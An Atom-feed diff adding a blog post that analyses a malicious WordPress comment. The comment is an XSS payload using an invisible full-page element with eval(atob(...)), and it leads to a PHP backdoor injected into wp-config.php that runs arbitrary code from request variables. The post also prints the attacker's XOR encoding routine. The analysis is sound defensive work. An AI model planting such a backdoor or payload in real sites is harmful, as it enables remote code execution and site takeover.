@@ -3,13 +3,219 @@
  <title>BrandonSilver.com</title>
  <link href="http://www.brandonsilver.com/atom.xml" rel="self"/>
  <link href="http://www.brandonsilver.com/"/>
- <updated>2014-08-17T21:46:54-05:00</updated>
+ <updated>2015-01-11T13:20:50-06:00</updated>
  <id>http://www.brandonsilver.com/</id>
  <author>
    <name>Brandon Silver</name>
    <email>brandon@silverimaging.net</email>
  </author>
 
+ 
+ <entry>
+   <title>Exploring malicious wordpress comment spam</title>
+   <link href="http://www.brandonsilver.com/2015/01/07/exploring-malicious-wordpress-spam.html"/>
+   <updated>2015-01-07T00:00:00-06:00</updated>
+   <id>http://www.brandonsilver.com/2015/01/07/exploring-malicious-wordpress-spam</id>
+   <content type="html">&lt;p&gt;&lt;strong&gt;DISCLAIMER:&lt;/strong&gt; The contents of this post may contain code that is unsafe to run. The
+purpose of this post is purely exploratory and meant for defensive purposes, and not as an intro to
+1337 hax0ring. If you use the knowledge below for bad, don&amp;#39;t blame me when the feds&amp;#39; party van comes
+for you. Your actions are your own.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Last updated on 2014-01-07 17:25 CST&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;I manage a few WordPress websites in my spare time. Most of the sites don&amp;#39;t have comments enabled,
+but a few do, so on occasion I&amp;#39;ll be alerted to new comments. The majority of those comments are
+spam (usually having something to do with advertising SEO opportunities) and thus are left in the
+purgatory of the moderation queue. However, one would-be comment was different from the usual
+fake-SEO tripe. This post will examine this particular comment and explore its malicious properties.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Tl;dr? see the summary at the bottom of this post.&lt;/em&gt;&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h3&gt;The raw comment&lt;/h3&gt;
+
+&lt;p&gt;This is the email notification I received when the comment was created. It includes the relevant
+metadata as well as the raw comment itself:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;A new comment on the post &amp;quot;Post&amp;quot; is waiting for your approval
+POST-URL
+
+Author : Wasia (IP: 50.63.194.123 , p3nlhg1391.shr.prod.phx3.secureserver.net)
+E-mail : aaa@aaa.com
+URL    :
+Whois  : http://whois.arin.net/rest/ip/50.63.194.123
+Comment:
+Welcome to WordPress. This is your first post. [&amp;lt;a title=&amp;quot;]&amp;quot; rel=&amp;quot;nofollow&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;[\&amp;quot; &amp;lt;!--
+style=\&amp;#39;position:fixed;top:0px;left:0px;width:6000px;height:6000px;color:transparent;z-index:999999999\&amp;#39;
+onmouseover=&amp;quot;eval(atob(\&amp;#39;naughty-javascript-in-base-64-goes-here&amp;#39;))&amp;quot; &amp;amp;gt; --&amp;gt;&amp;lt;a&amp;gt;&amp;lt;/a&amp;gt;] Edit or delete it, then start blogging!
+
+Approve it: APPROVE-URL
+Trash it: TRASH-URL
+Spam it: SPAM-URL
+Currently 100 comments are waiting for approval. Please visit the moderation panel:
+PANEL-URL&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The comment appears to be setup to force anyone who visits the page it inhabits to run some
+obfuscated javascript (the large chunk of characters within the &lt;code&gt;eval(atob())&lt;/code&gt; ).&lt;/p&gt;
+
+&lt;h3&gt;De-obfuscating the comment&amp;#39;s JavaScript&lt;/h3&gt;
+
+&lt;p&gt;De-obfuscation of the javascript is accomplished by decoding the block of characters inside of the
+atob() function call from base-64. It&amp;#39;s now clear that this script is trying to create an iframe on
+the page and fill it with the wordpress installation&amp;#39;s plugin editor in order to edit the
+&lt;code&gt;hello.php&lt;/code&gt; plugin. If the desired changes have already been made, then it will instead
+set the iframe to run the modified &lt;code&gt;hello.php&lt;/code&gt; script.&lt;/p&gt;
+
+&lt;p&gt;But what are those changes? I found the answer by decoding a base-64 string that was being added (in
+decoded form) to &lt;code&gt;hello.php&lt;/code&gt;. It turned out to be a chunk of PHP that serves to exploit
+incorrect file permission settings to allow for arbitrary remote code execution. &lt;/p&gt;
+
+&lt;h3&gt;Overview of the modifications to hello.php&lt;/h3&gt;
+
+&lt;p&gt;The main target of the attack appears to be &lt;code&gt;wp-config.php&lt;/code&gt;, a file that holds important
+settings for WordPress sites (like database access credentials). The script injects some code into
+&lt;code&gt;wp-config.php&lt;/code&gt; (reproduced in a more readable form below):&lt;/p&gt;
+
+&lt;h4&gt;Injection into wp-config.php&lt;/h4&gt;
+
+&lt;table class=&quot;highlighttable&quot;&gt;&lt;tr&gt;&lt;td class=&quot;linenos&quot;&gt;&lt;div class=&quot;linenodiv&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;1
+2
+3
+4
+5
+6&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;FILE&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;unique-value-here&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;$_&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;FILE&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;($_);&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$_FILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stripslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HOST&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;It appears that by adding this code the attacker can execute arbitrary code contained in a
+specially-crafted request to &lt;code&gt;wp-config.php&lt;/code&gt;. Specifically, any request with the &amp;#39;FILE&amp;#39;
+variable set will execute the code supplied by the request variable with the same name as a unique
+ID generated previously in the script. This provides the attacker with the ability to limit access
+to this exploit. &lt;/p&gt;
+
+&lt;p&gt;Next, the script moves to correct the permissions of &lt;code&gt;wp-config.php&lt;/code&gt; in order to prevent
+other attackers from gaining control (a consistent theme in this script, as will be shown below).
+Another consistent theme of this attack is the clever hiding of modified files&amp;#39; modification dates.
+This ensures that a simple directory listing doesn&amp;#39;t give away that the exploit has occurred. &lt;/p&gt;
+
+&lt;h4&gt;Phoning home: report()&lt;/h4&gt;
+
+&lt;p&gt;In order for the attacker to make use of the now-compromised site, it is necessary for them to
+obtain the unique ID in the script. The &lt;code&gt;report()&lt;/code&gt; function sends that and the WordPress
+installation&amp;#39;s host to a hardcoded list of sites. The reporting action is accomplished via a series
+of HTTP GET requests containing this information as a URL parameter.&lt;/p&gt;
+
+&lt;h4&gt;Basic encryption: Uno_encode()&lt;/h4&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Uno_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$Salt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;dc5p9dOpBc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$StrLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;DMEf5HZuPq&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$StrLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;H*&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The data reported back to the attackers is first encrypted by the &lt;code&gt;Uno_encode()&lt;/code&gt;
+function. It&amp;#39;s notable because it doesn&amp;#39;t use a standard cryptosystem (like AES or RSA);
+instead, it takes a much simpler approach by creating a sort of static key and then XORing it with
+the string to be encrypted. Decryption can be accomplished by sending the base-64 decoded ciphertext
+through the same function, like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Uno_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Uno_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Of course, this requires that you know the values for &lt;code&gt;$Salt&lt;/code&gt; and &lt;code&gt;$Seq&lt;/code&gt; (as
+well as the rest of the algorithm), so it&amp;#39;s reasonably secure as long as those secrets aren&amp;#39;t known.
+Unfortunately for the attackers, now they &lt;em&gt;are&lt;/em&gt; known, and they now wish they had chosen an asymmetric
+algorithm instead (since exposing a public key wouldn&amp;#39;t have also exposed their communications).&lt;/p&gt;
+
+&lt;h4&gt;Self-patching and self-removal&lt;/h4&gt;
+
+&lt;p&gt;After modifying &lt;code&gt;wp-config.php&lt;/code&gt; and reporting back, the script takes steps to hide its
+tracks and secure the injected code&amp;#39;s place in the WordPress installation. First, it removes the
+original malicious comment from the MySQL database. Next, it patches the WordPress installation by
+modifying the &lt;code&gt;wp-comments-post.php&lt;/code&gt; file to completely block the posting of new
+comments. It&amp;#39;s definitely a sledgehammer approach to fixing the vulnerability used in this exploit,
+but it works as long as no one gets curious as to why new comments can&amp;#39;t be posted. Finally, the
+script removes itself from &lt;code&gt;hello.php&lt;/code&gt;. It uses an MD5 hash value at the bottom of the script
+as a boundary marker to indicate where the malicious script ends and the original content begins. &lt;/p&gt;
+
+&lt;h3&gt;Summary&lt;/h3&gt;
+
+&lt;p&gt;This exploit originates as a comment designed to look like the default WordPress post. The first
+time it&amp;#39;s viewed it runs some JavaScript which adds the PHP previously described to a plugin,
+&lt;code&gt;hello.php&lt;/code&gt;. The second time the comment is viewed it executes the plugin, in turn
+running code that&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;injects more PHP into the WordPress installation&amp;#39;s settings file, &lt;code&gt;wp-config.php&lt;/code&gt;,&lt;/li&gt;
+&lt;li&gt;sends information back to the attackers (allowing them to execute
+arbitrary code with a specially-crafted request using the injected code from 1.),&lt;/li&gt;
+&lt;li&gt;removes the comment, and&lt;/li&gt;
+&lt;li&gt;removes the malicious code added to &lt;code&gt;hello.php&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4&gt;Requirements for vulnerability&lt;/h4&gt;
+
+&lt;p&gt;Now that I&amp;#39;ve gone through the exploit I think I can speculate as to what it would take for a
+WordPress site to be vulnerable to it. It seems to require the following to be true:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Commenting must be enabled&lt;/li&gt;
+&lt;li&gt;Commenting must be open to everyone&lt;/li&gt;
+&lt;li&gt;Comments must be automatically approved (no moderation queue)&lt;/li&gt;
+&lt;li&gt;The web server (or whatever entity is running WordPress) must be able to write to the WordPress
+installation directory&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Number 4 is the big one, since many folks installing WordPress themselves can make the easy mistake
+of using incorrect file system permissions.&lt;/p&gt;
+
+&lt;h3&gt;Final thoughts&lt;/h3&gt;
+
+&lt;p&gt;Something that struck me as odd was that there wasn&amp;#39;t an immediate attempt to exfiltrate the
+database access credentials. Wouldn&amp;#39;t a list of valid credentials be valuable?&lt;/p&gt;
+
+&lt;h3&gt;BONUS -- A CONNECTION TO ANOTHER EXPLOIT?!&lt;/h3&gt;
+
+&lt;p&gt;I got curious about the MD5 hash (&lt;code&gt;49de371511c1de3bde34b0108ec7f129&lt;/code&gt;) at the bottom of
+the PHP code that gets added to &lt;code&gt;hello.php&lt;/code&gt; and did some googling. &lt;a href=&quot;https://www.planetspork.com/w/2014/11/this-seems-interesting/&quot;&gt;This
+guy&lt;/a&gt; had someone try to use
+shellshock to add some PHP to his site, and as part of the PHP&amp;#39;s access control it compares the MD5
+of the requesting browser&amp;#39;s user agent to the MD5 hash value listed at the bottom of the PHP in this exploit.
+It seems that the same entity might be responsible for both exploits.&lt;/p&gt;
+
+&lt;h3&gt;References / Resources Used&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.base64decode.org/&quot;&gt;Base-64 decoder&lt;/a&gt; to decode the base-64 strings&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.w3schools.com/jsref/met_win_atob.asp&quot;&gt;w3schools&lt;/a&gt; to brush up on basic JavaScript&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://php.net/manual/en/index.php&quot;&gt;The PHP Manual&lt;/a&gt; for a refresher on common PHP functions&lt;/li&gt;
+&lt;li&gt;The #crypto channel on the &lt;a href=&quot;http://freenode.net/&quot;&gt;Freenode IRC network&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Major site overhaul</title>
